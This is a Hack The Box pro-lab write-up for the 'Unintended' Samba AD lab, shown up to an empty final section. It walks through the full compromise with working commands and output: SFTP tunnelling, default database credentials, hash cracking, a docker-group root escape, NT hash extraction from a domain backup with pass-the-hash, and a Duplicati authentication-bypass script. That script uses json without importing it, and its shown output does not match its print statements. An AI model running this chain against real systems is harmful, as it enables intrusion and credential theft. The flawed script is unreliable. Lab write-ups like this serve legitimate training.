---
title: "Hackthebox - Unintended PROLAB"
date: 2025-12-11
categories: writeup-prolab
tags: active-directory samba docker lateral-movement gitea mattermost postgresql
---

Unintended is an intermediate mini pro lab on Hack The Box (originally a medium difficulty chain on Vulnlab) created by kavigihan.
It consists of three Linux machines:
- **10.13.38.57** - DC (Domain Controller)
- **10.13.38.58** - BACKUP
- **10.13.38.59** - WEB

## nmap

```bash
└─$ sudo nmap 10.13.38.57-59 -p-    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 20:05 CEST
Nmap scan report for 10.13.38.57
Host is up (0.047s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown

Nmap scan report for 10.13.38.59
Host is up (0.019s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown
8200/tcp open  trivnet1

Nmap scan report for 10.13.38.58
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
Nmap done: 3 IP addresses (3 hosts up) scanned in 84.97 seconds
```
Running a more detailed scan with `-sC -sVT`:

```bash
└─$ sudo nmap 10.13.38.57-59 -p- -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 20:13 CEST
Nmap scan report for 10.13.38.57
Host is up (0.017s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain       (generic dns response: NOTIMP)
88/tcp    open  kerberos-sec (server time: 2024-04-25 18:14:36Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Samba smbd 4.6.2
389/tcp   open  ldap         (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
445/tcp   open  netbios-ssn  Samba smbd 4.6.2
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap     (Anonymous bind OK)
3268/tcp  open  ldap         (Anonymous bind OK)
3269/tcp  open  ssl/ldap     (Anonymous bind OK)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC

Nmap scan report for 10.13.38.59
Host is up (0.018s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Werkzeug/3.0.1 Python/3.11.8
|_http-title: Under Construction
8065/tcp open  unknown
8200/tcp open  http    Duplicati httpserver
| http-title: Duplicati Login

Nmap scan report for 10.13.38.58
Host is up (0.018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.7
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
```

The scans show that the first machine is a Linux domain controller using Samba AD. The other two machines are then likely also joined to the domain.

Let's add the relevant entries in `/etc/hosts` for the DC.

```bash
└─$ echo "10.13.38.57 dc.unintended.vl dc unintended.vl" | sudo tee -a /etc/hosts
10.13.38.57 dc.unintended.vl dc unintended.vl
```

## Domain enumeration (unauthenticated)

```bash
└─$ ldapsearch -H ldap://dc -x -LLL -s base -b ''
dn:
configurationNamingContext: CN=Configuration,DC=unintended,DC=vl
defaultNamingContext: DC=unintended,DC=vl
rootDomainNamingContext: DC=unintended,DC=vl
vendorName: Samba Team (https://www.samba.org)
dnsHostName: dc.unintended.vl
domainFunctionality: 4
forestFunctionality: 4
domainControllerFunctionality: 4
```

We can enumerate users and shares with a SMB null session:

```bash
└─$ nxc smb dc -u '' -p '' --users          
SMB         10.13.38.57   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.57   445    DC               [+] unintended.vl\: 
SMB         10.13.38.57   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.13.38.57   445    DC               Administrator                 2024-02-24 19:33:16 0       Built-in account for administering the computer/domain 
SMB         10.13.38.57   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.13.38.57   445    DC               krbtgt                        2024-02-24 19:33:16 0       Key Distribution Center Service Account 
SMB         10.13.38.57   445    DC               juan                          2024-02-24 19:40:31 0        
SMB         10.13.38.57   445    DC               abbie                         2024-02-24 19:40:32 0        
SMB         10.13.38.57   445    DC               cartor                        2024-02-24 19:40:32 0        
```

We can also use rpcclient to generate a list of users:

```bash
└─$ rpcclient -U '' -N 10.13.38.57 -c enumdomusers | cut -d'[' -f2 | cut -d']' -f1 | tee users.txt
Administrator
Guest
krbtgt
juan
abbie
cartor
```

## Web recon

Let's take a look at the website on port 80 of 10.13.38.59. Nothing interesting except the `admin@web.unintended.vl` email indicating the potential usage of virtual hosts. Let's try to brute-force:

```bash
└─$ ffuf -u http://10.13.38.59/ -H 'Host: FUZZ.unintended.vl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

chat                    [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 26ms]
code                    [Status: 200, Size: 13651, Words: 1050, Lines: 272, Duration: 20ms]
```

We can also brute-force the DNS service on the DC:

```bash
└─$ dnsenum --dnsserver 10.13.38.57 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt unintended.vl

Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:
_______________________________________________________________________________________

web.unintended.vl.                       900      IN    A        10.10.10.12
web.unintended.vl.                       900      IN    A        10.10.180.22
backup.unintended.vl.                    900      IN    A        10.10.10.13
backup.unintended.vl.                    900      IN    A        10.10.180.23
chat.unintended.vl.                      900      IN    A        10.10.180.22
dc.unintended.vl.                        3600     IN    A        10.10.180.21
code.unintended.vl.                      900      IN    A        10.10.10.12
code.unintended.vl.                      900      IN    A        10.10.180.22
```

Then add the found subdomains to `/etc/hosts`:

```bash
└─$ echo "10.13.38.59 web.unintended.vl chat.unintended.vl code.unintended.vl" | sudo tee -a /etc/hosts
10.13.38.59 web.unintended.vl chat.unintended.vl code.unintended.vl

└─$ echo "10.13.38.58 backup.unintended.vl" | sudo tee -a /etc/hosts           
10.13.38.58 backup.unintended.vl
```

A Mattermost instance is accessible at `http://chat.unintended.vl/`, but we can't login yet. A Gitea instance is available at `http://code.unintended.vl`. Finally a Duplicati web UI is exposed at `http://web.unintended.vl:8200`, but we don't have the password.

## Gitea (unauthenticated)

Even without credentials we can enumerate the users at `http://code.unintended.vl/explore/users` and repositories at `http://code.unintended.vl/explore/repos`. There's a public repository `http://code.unintended.vl/juan/DevOps`.

Looking at the commit history, in one of the commits we find potentially real SFTP credentials replaced by generic ones:

`http://code.unintended.vl/juan/DevOps/commit/75f1f713696016f7713e33f836b05ce14784fc22`

```dockerfile
ENV APP_SECRET 6SU28SH286DY8HS7D
ENV SFTP_USER ftp_user
ENV SFTP_PASS <REDACTED>
```

It doesn't allow SSH login:

```bash
└─$ sshpass -p <SFTP_PASS> ssh ftp_user@10.13.38.59
This service allows sftp connections only.
Connection to 10.13.38.59 closed.
```

There's no files we can read over SFTP:

```bash
└─$ sshpass -p <SFTP_PASS> sftp ftp_user@10.13.38.59
Connected to 10.13.38.59.
sftp> ls -lah
drwxr-xr-x    ? 0        0            4.0K Feb 24 20:47 .
drwxr-xr-x    ? 0        0            4.0K Feb 24 20:47 ..
drwx------    ? 1001     1001         4.0K Feb 24 20:47 ftp_user
sftp> cd ftp_user/
sftp> ls -lah
drwx------    ? 1001     1001         4.0K Feb 24 20:47 .
drwxr-xr-x    ? 0        0            4.0K Feb 24 20:47 ..
```

According to [this section on HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#sftp-command-execution) the SFTP service may be misconfigured to allow port forwarding and tunneling even if it disallows SSH login, allowing us to probe and reach internal ports and networks.

Let's set up a SOCKS proxy:

```bash
└─$ sshpass -p <SFTP_PASS> ssh -D 1080 -N ftp_user@10.13.38.59
```

Update `/etc/proxychains4.conf` if necessary:

```bash
socks4 127.0.0.1 1080
```

Then scan for ports exposed on localhost:

```bash
└─$ proxychains nmap 127.0.0.1 -p-
[proxychains] config file found: /etc/proxychains4.conf
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 18:10 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.018s latency).
Not shown: 65525 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
222/tcp   open  rsh-spx
3000/tcp  open  ppp
3306/tcp  open  mysql
8000/tcp  open  http-alt
8065/tcp  open  unknown
8200/tcp  open  trivnet1
42603/tcp open  unknown
58050/tcp open  unknown
```

We found some new ports. We can connect to the MySQL port (3306) with default credentials:

```bash
└─$ proxychains mysql -h 127.0.0.1 -u root -proot
[proxychains] config file found: /etc/proxychains4.conf
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 427
Server version: 8.3.0 MySQL Community Server - GPL

MySQL [(none)]>
```

It's used by Gitea:

```sql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.021 sec)

MySQL [(none)]> use gitea;
Database changed
```

There seems to be a private repository `home-backup`:

```sql
MySQL [gitea]> select owner_name,name,description from repository;
+------------+-------------+-----------------------------------------------------------------+
| owner_name | name        | description                                                     |
+------------+-------------+-----------------------------------------------------------------+
| juan       | DevOps      | Templates and config files for automation and server management |
| juan       | home-backup | Backup for home directory in WEB                                |
+------------+-------------+-----------------------------------------------------------------+
```

Let's extract the hashes:

```sql
MySQL [gitea]> select email,passwd,passwd_hash_algo,salt,is_admin from user;
+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
| email                       | passwd                                                                                               | passwd_hash_algo | salt                             | is_admin |
+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
| administrator@unintended.vl | f57a3<........................................................................................>be902 | pbkdf2$50000$50  | 6f7cf4aa34feb922092ef9f7ca342fa5 |        1 |
| juan@unintended.vl          | d8bf3<........................................................................................>c9b51 | pbkdf2$50000$50  | a3914c8815b674a9f680eaf8eb799e19 |        0 |
+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
```

By looking at the Gitea source code we can confirm it uses PBKDF2 with SHA256 as the hash algorithm.

In the hashcat wiki we can find the format to crack a PBKDF2 hash:

```
10900  PBKDF2-HMAC-SHA256  sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt 
```

The correct format is `sha256:<number_of_iterations>:<base64_salt>:<base64_hash>`.

Let's try to crack the administrator's hash:

```
└─$ echo '6f7cf4aa34feb922092ef9f7ca342fa5' | xxd -r -p | base64
b3z0qjT+uSIJLvn3yjQvpQ==

└─$ echo 'f57a3<REDACTED>be902' | xxd -r -p | base64
9Xo9X<REDACTED>76QI=
```

Save in `administrator.gitea.hash`:

```
sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9X<REDACTED>76QI=
```

```bash
└─$ hashcat -a0 -m10900 administrator.gitea.hash /usr/share/wordlists/rockyou.txt
...
sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9X<REDACTED>76QI=:<ADMIN_GITEA_PASS>
```

Juan's hash doesn't crack with rockyou.txt.

## Gitea (as administrator)

Now we can login to Gitea with the administrator's password we just cracked, and access the private repository `home-backup` at `http://code.unintended.vl/juan/home-backup`.

The `.bash_history` file at `http://code.unintended.vl/juan/home-backup/src/branch/main/.bash_history` contains a passphrase for a SSH key set by juan.

## Domain enumeration (as juan)

The SSH passphrase is reused from juan's domain password:

```bash
└─$ nxc smb dc -u juan -p <JUAN_PASS>                           
SMB         10.13.38.57   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.57   445    DC               [+] unintended.vl\juan:<JUAN_PASS>
```

Now that we have valid AD credentials we can perform some enumeration with ldapsearch.

To get the list of all groups and their members:

```bash
└─$ LDAPTLS_REQCERT=never ldapsearch -H ldaps://dc -D juan@unintended.vl -w <JUAN_PASS> -LLL -s sub -b 'DC=unintended,DC=vl' '(objectclass=group)' 'member'
...
dn: CN=Domain Admins,CN=Users,DC=unintended,DC=vl
member: CN=Administrator,CN=Users,DC=unintended,DC=vl
member: CN=cartor,CN=Users,DC=unintended,DC=vl
...
dn: CN=Backup Operators,CN=Builtin,DC=unintended,DC=vl
member: CN=abbie,CN=Users,DC=unintended,DC=vl

dn: CN=Web Developers,CN=Users,DC=unintended,DC=vl
member: CN=juan,CN=Users,DC=unintended,DC=vl
...
```

**juan** is a member of Web Developers, **abbie** is a member of Backup Operators and **cartor** is a member of Domain Admins.

## SSH to WEB (as juan)

Juan can SSH into WEB. Do not forget to specify the domain in the SSH login username.

```bash
└─$ sshpass -p <JUAN_PASS> ssh -l juan@unintended.vl web.unintended.vl
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
...
juan@unintended.vl@web:~$
```

Let's do some basic enumeration:

```bash
juan@unintended.vl@web:~$ id
uid=320201103(juan@unintended.vl) gid=320200513(domain users@unintended.vl) groups=320200513(domain users@unintended.vl),320201106(web developers@unintended.vl)

juan@unintended.vl@web:~$ ls /home/
abbie@unintended.vl  administrator@unintended.vl  juan@unintended.vl  svc
```

We get the first flag:

```bash
juan@unintended.vl@web:~$ cat flag.txt 
Unintended{...}
```

## Mattermost (as juan)

We can now login to the Mattermost webapp at `http://chat.unintended.vl/login` with the email `juan@unintended.vl` and the password we found, and look through the chat history.

We find messages mentioning a PostgreSQL database for Mattermost, and a hint that abbie is likely using **name + birthyear** as a password.

## Mattermost (PostgreSQL database)

### Locating the right container

The important hint we can get from the messages is that Mattermost is using a PostgreSQL database (which by defaults listens on port 5432). From the messages and the Docker related files in the DevOps repository we found earlier, we can deduce that the Mattermost instance is deployed via Docker.

The PostgreSQL port is not forwarded to the host itself, so we need to find the Docker subnet that the Mattermost instance is using:

```bash
juan@unintended.vl@web:~$ ip route
default via 10.10.235.17 dev ens5 proto dhcp src 10.10.235.22 metric 100 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
172.18.0.0/16 dev br-9f7c921da56a proto kernel scope link src 172.18.0.1 
172.19.0.0/16 dev br-1c74e0922629 proto kernel scope link src 172.19.0.1 
172.21.0.0/16 dev br-d2d8c10f2c77 proto kernel scope link src 172.21.0.1 
```

With trial and error we find out that `172.18.0.3` is the PostgreSQL database instance used by Mattermost.

```bash
└─$ proxychains -q nmap 172.18.0.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 01:53 CEST
Nmap scan report for 172.18.0.3
Host is up (0.017s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5432/tcp open  postgresql
```

### Default credentials

By searching for `mattermost docker postgres install` we stumble on a guide in the official documentation. In the GitHub repository referenced in the article there's a [env.example](https://github.com/mattermost/docker/blob/main/env.example) file containing the default credentials for PostgreSQL.

```bash
└─$ PGPASSWORD=mmuser_password proxychains psql -h 172.18.0.3 -d mattermost -U mmuser                                        
[proxychains] config file found: /etc/proxychains4.conf
psql (16.2 (Debian 16.2-1), server 13.14)
Type "help" for help.

mattermost=# 
```

It works for our target!

### Exfiltration

In the `posts` table we find a new potential password:

```sql
mattermost=# select message from posts;
...
 Here, `<ABBIE_PASS>`, change it to one you can actually *remember*, and please make sure you do so lol I have way more important things to do than resetting your passwords  :joy:
```

It works as abbie's domain password:

```bash
└─$ nxc smb dc -u abbie -p <ABBIE_PASS>   
SMB         10.10.156.133   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.156.133   445    DC               [+] unintended.vl\abbie:<ABBIE_PASS>
```

Another method is to try to crack abbie's hash from the users table:

```sql
mattermost=# select email,password from users;
          email          |                           password                           
-------------------------+--------------------------------------------------------------
 juan@unintended.vl      | $2a$10$XVs<.............................................>7aa
 cartor@unintended.vl    | $2a$10$1LN<.............................................>RC.
 abbie@unintended.vl     | $2a$10$2IN<.............................................>0mu
```

We already know that abbie is likely using name + birthyear as a password. Let's generate a wordlist:

```bash
└─$ cook abbie,spencer,Abbie,Spencer,theabbs 1920-2024 > abbie.wordlist

└─$ hashcat -a0 -m3200 '$2a$10$2IN<REDACTED>0mu' abbie.wordlist
...
$2a$10$2IN<REDACTED>0mu:<ABBIE_MM_PASS>
```

## SSH to BACKUP (as abbie)

Abbie can SSH into BACKUP.

```bash
└─$ sshpass -p <ABBIE_PASS> ssh -l abbie@unintended.vl backup.unintended.vl
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
...
abbie@unintended.vl@backup:~$ 

abbie@unintended.vl@backup:~$ id
uid=320201104(abbie@unintended.vl) gid=320200513(domain users@unintended.vl) groups=320200513(domain users@unintended.vl),119(docker)
```

Abbie is in the **docker** group which makes it trivial to become root on the host by mounting the root filesystem in a container.

Since BACKUP doesn't have internet access we need to use an existing image.

```bash
abbie@unintended.vl@backup:~$ docker image ls
REPOSITORY   TAG           IMAGE ID       CREATED         SIZE
python       3.11.2-slim   4d2191666712   13 months ago   128MB

abbie@unintended.vl@backup:~$ docker run -it --rm -v /:/mnt python:3.11.2-slim chroot /mnt bash
root@9ac5c6621b4e:/# 
```

We get the second flag:

```bash
root@9ac5c6621b4e:~# cat /root/flag.txt 
unintended{...}
```

## Getting the Samba backup

We can also enumerate and run commands in existing containers:

```bash
abbie@unintended.vl@backup:~$ docker ps
CONTAINER ID   IMAGE                COMMAND           CREATED        STATUS             PORTS     NAMES
3b4f611ft672   python:3.11.2-slim   "sh ./setup.sh"   2 months ago   Up About an hour             scripts_ftp_1
```

`scripts_ftp_1` seems to be for the FTP service running on port 21.

```bash
abbie@unintended.vl@backup:~$ docker exec -it scripts_ftp_1 bash
root@ftp:/ftp# 

root@ftp:/ftp# ls -la volumes/
total 16
drwxr-xr-x 4 root root 4096 Jan 25 08:36 .
drwxr-xr-x 3 root root 4096 Feb 24 19:56 ..
drw-rw---- 2 root root 4096 Jan 25 07:13 docker_src
drw-rw---- 2 root root 4096 Feb 17 20:33 domain_backup
```

There's a Samba backup (likely of the AD database):

```bash
root@ftp:/ftp# ls -la volumes/domain_backup/
total 1628
drw-rw---- 2 root root    4096 Feb 17 20:33 .
drwxr-xr-x 4 root root    4096 Jan 25 08:36 ..
-rw-rw---- 1 root root 1654914 Feb 17 20:33 samba-backup-2024-02-17T20-32-13.580437.tar.bz2
```

Let's transfer it to our attack machine:

```bash
abbie@unintended.vl@backup:~$ docker cp scripts_ftp_1:/ftp/volumes/domain_backup/samba-backup-2024-02-17T20-32-13.580437.tar.bz2 .
Successfully copied 1.66MB to /home/abbie@unintended.vl/.

└─$ sshpass -p <ABBIE_PASS> scp abbie@unintended.vl@backup.unintended.vl:samba-backup-2024-02-17T20-32-13.580437.tar.bz2 .  
```

Extract the backup:

```bash
└─$ mkdir backup && tar -xvf samba-backup-2024-02-17T20-32-13.580437.tar.bz2 -C backup
sysvol.tar.gz
backup.txt
private/secrets.tdb
private/privilege.ldb
private/sam.ldb
private/dns_update_list
private/spn_update_list
private/schannel_store.tdb
private/krb5.conf
private/secrets.ldb
private/passdb.tdb
private/idmap.ldb
private/dns_update_cache
private/secrets.keytab
private/encrypted_secrets.key
private/hklm.ldb
private/share.ldb
private/tls/ca.pem
private/tls/cert.pem
private/tls/key.pem
private/sam.ldb.d/DC=DOMAINDNSZONES,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/CN=CONFIGURATION,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/metadata.tdb
private/sam.ldb.d/DC=FORESTDNSZONES,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/CN=SCHEMA,CN=CONFIGURATION,DC=UNINTENDED,DC=VL.ldb
state/share_info.tdb
state/group_mapping.tdb
state/winbindd_cache.tdb
state/registry.tdb
state/account_policy.tdb
etc/smb.conf.bak
etc/gdbcommands
etc/smb.conf
```

We can confirm it's a backup of the DC:

```bash
└─$ cat backup/etc/smb.conf                             
# Global parameters
[global]
    dns forwarder = 127.0.0.53
    netbios name = DC
    realm = UNINTENDED.VL
    server role = active directory domain controller
    workgroup = UNINTENDED
    idmap_ldb:use rfc2307 = yes
...
```

## Extracting Administrator's hash

The `private/sam.ldb` file seems interesting as we might be able to extract hashes from it.

I tried using `ldbsearch` directly on my exegol machine but kept running into compatibility issues with the Samba database format. After some research, I found that the cleanest solution is to use a Samba AD Docker container that has all the proper tools pre-installed.

### Using Samba AD Docker container

First, let's spin up a Samba AD Docker container:

```bash
└─$ sudo docker run -it --rm --name samba-ad -v $(pwd)/backup/private:/private diegogslomp/samba-ad-dc bash
[root@40131503fcab sbin]# 
```

Now we have access to the proper `ldbsearch` tool that's compatible with the Samba AD database format:

```bash
[root@40131503fcab sbin]# ls
samba-domain-demote  samba-domain-join  samba-domain-provision  samba-tests  update-etc-files

[root@40131503fcab sbin]# cd /private/
```

Let's extract Administrator's hash using the proper query:

```bash
[root@40131503fcab private]# ldbsearch -H ./sam.ldb -b dc=unintended,dc=vl '(&(objectClass=user)(sAMAccountname=administrator))' unicodePwd
Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it
# record 1
dn: CN=Administrator,CN=Users,DC=unintended,DC=vl
unicodePwd:: Nv4kHqDqpTPV+si9f7b4ow==

# Referral
ref: ldap:///CN=Configuration,DC=unintended,DC=vl

# Referral
ref: ldap:///DC=DomainDnsZones,DC=unintended,DC=vl

# Referral
ref: ldap:///DC=ForestDnsZones,DC=unintended,DC=vl

# returned 4 records
# 1 entries
# 3 referrals
```

The warning about `smb.conf` can be ignored - it doesn't affect the hash extraction.

Now let's decode the hash from Base64 to hex format for use with pass-the-hash:

```bash
└─$ echo 'Nv4kHqDqpTPV+si9f7b4ow==' | base64 -d | xxd -p
36fe241ea0eaa533d5fac8bd7fb6f8a3
```

Let's try to crack it with rockyou.txt:

```bash
└─$ hashcat -a0 -m1000 36fe241ea0eaa533d5fac8bd7fb6f8a3 /usr/share/wordlists/rockyou.txt
```

It doesn't crack, but we can use pass-the-hash over SMB:

```bash
└─$ nxc smb dc -u Administrator -H 36fe241ea0eaa533d5fac8bd7fb6f8a3         
SMB         10.13.38.57   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.57   445    DC               [+] unintended.vl\Administrator:36fe241ea0eaa533d5fac8bd7fb6f8a3 (Pwn3d!)
```

We can read and write to our home directory:

```bash
└─$ nxc smb dc -u Administrator -H 36fe241ea0eaa533d5fac8bd7fb6f8a3 --shares
SMB         10.13.38.57   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.57   445    DC               [+] unintended.vl\Administrator:36fe241ea0eaa533d5fac8bd7fb6f8a3 (Pwn3d!)
SMB         10.13.38.57   445    DC               [*] Enumerated shares
SMB         10.13.38.57   445    DC               Share           Permissions     Remark
SMB         10.13.38.57   445    DC               -----           -----------     ------
SMB         10.13.38.57   445    DC               sysvol          READ,WRITE      
SMB         10.13.38.57   445    DC               netlogon        READ,WRITE      
SMB         10.13.38.57   445    DC               home            READ,WRITE      Home Directories
SMB         10.13.38.57   445    DC               IPC$                            IPC Service (Samba 4.15.13-Ubuntu)
```

By using smbclient with pass-the-hash we can read the root flag:

```bash
└─$ smbclient -U Administrator --password=36fe241ea0eaa533d5fac8bd7fb6f8a3 --pw-nt-hash //dc.unintended.vl/home
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 30 09:37:08 2024
  ..                                  D        0  Sat Feb 24 21:13:16 2024
  .profile                            H      807  Sat Feb 24 21:13:16 2024
  .cache                             DH        0  Sat Feb 24 21:13:16 2024
  .bashrc                             H     3771  Sat Feb 24 21:13:16 2024
  .bash_logout                        H      220  Sat Feb 24 21:13:16 2024
  root.txt                            N       37  Sat Mar 30 09:37:08 2024

smb: \> get root.txt
getting file \root.txt of size 37 as root.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit

└─$ cat root.txt    
VL{...}
```

##  Root on WEB

There's a third user flag that involves getting root on WEB. It consists of extracting the Duplicati server passphrase from a backup, logging in to the web interface and creating a malicious backup and restore.

### Extracting the Duplicati server passphrase

First transfer the Duplicati backup we found on BACKUP to our attack host:

```bash
abbie@unintended.vl@backup:~$ docker exec -it scripts_ftp_1 bash
root@ftp:/ftp# 

root@ftp:/ftp/volumes# tar -zcf docker_src.tar.gz docker_src/

abbie@unintended.vl@backup:~$ docker cp scripts_ftp_1:/ftp/volumes/docker_src.tar.gz .
Successfully copied 142MB to /home/abbie@unintended.vl/.

└─$ sshpass -p <ABBIE_PASS> scp abbie@unintended.vl@backup.unintended.vl:~/docker_src.tar.gz .

└─$ tar -zxf docker_src.tar.gz && rm docker_src.tar.gz
```

We can use the [restore script from Duplicati](https://github.com/duplicati/duplicati/tree/master/Tools/Commandline/RestoreFromPython) to restore the backup from Linux:

```bash
└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/ijson.py
└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/pyaescrypt.py
└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/restore_from_python.py

└─$ mkdir restore
└─$ python3 restore_from_python.py
Welcome to Python Duplicati recovery.
Please type the full path to a directory with Duplicati's .aes or .zip files:./docker_src
Please type * to restore all files, or a pattern like /path/to/files/* to restore the files in a certain directory)*
Please enter the path to an empty destination directory:restore
```

We find the database of the Duplicati server:

```bash
└─$ tree restore/source/root/scripts/duplicati                      
restore/source/root/scripts/duplicati
└── config
    ├── control_dir_v2
    │   └── lock_v2
    ├── Duplicati-server.sqlite
    ├── IRFTMLEYVT.sqlite
    └── IRFTMLEYVT.sqlite-journal
```

In the database we find the `server-passphrase`:

```bash
└─$ sqlite3 restore/source/root/scripts/duplicati/config/Duplicati-server.sqlite
SQLite version 3.45.1 2024-01-30 16:01:20
sqlite> select * from Option;
...
-2||server-passphrase|ZhB5v<REDACTED>uuQk=
-2||server-passphrase-salt|j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w=
...
```

### Login to Duplicati

It turns out that we can login to the web interface by knowing the `server-passphrase`. There's an [article](https://medium.com/@asjohnreese/duplicati-authentication-bypass-42f6a5d50e96) that explains the attack in detail.

The authentication works by:
1. Getting a nonce from the server
2. Computing `noncedpwd = SHA256(nonce + server-passphrase)`
3. Sending `noncedpwd` as the password parameter

Here's a script to automate the login:

```python
import requests
import base64
import hashlib

server_passphrase = 'ZhB5v<REDACTED>uuQk='

# Set headers with proper Host
headers = {
    'Host': 'web.unintended.vl:8200'
}

s = requests.Session()
s.headers.update(headers)
s.get('http://web.unintended.vl:8200/login.html')

# Get nonce
r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
    'get-nonce': 1
})

print(f"Status: {r.status_code}")
print(f"Headers: {dict(r.headers)}")
print(f"Raw content (first 500 bytes): {r.content[:500]}")
print(f"Text content: {repr(r.text[:500])}")

# Decode with utf-8-sig to strip BOM if present
response_text = r.content.decode('utf-8-sig')
nonce_data = json.loads(response_text)
nonce = nonce_data['Nonce']

# Compute noncedpwd
saltedpwd_bin = base64.b64decode(server_passphrase)
noncedpwd = base64.b64encode(hashlib.sha256(base64.b64decode(nonce) + saltedpwd_bin).digest()).decode()

# Login with noncedpwd
r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
    'password': noncedpwd
})

from urllib.parse import unquote

print(f'Status code: {r.status_code}')
print(f'\nCookies décodés:')
print('-' * 80)
print(f'{"Cookie Name":<20} | {"Decoded Value"}')
print('-' * 80)

for cookie in s.cookies:
    decoded_value = unquote(cookie.value)
    print(f'{cookie.name:<20} | {decoded_value}')
```

```bash
└─$ python3 login.py
Status code: 200
Cookies: <RequestsCookieJar[<Cookie xsrf-token=... for web.unintended.vl/>, <Cookie session-nonce=... for web.unintended.vl/>, <Cookie session-auth=... for web.unintended.vl/>]>
```

At `http://web.unintended.vl:8200/login.html` we add or replace the cookie values to what the script gave us (make sure the path is set to `/`).

After navigating to `http://web.unintended.vl:8200/` again, we will successfully login!

### Read the flag with backup and restore

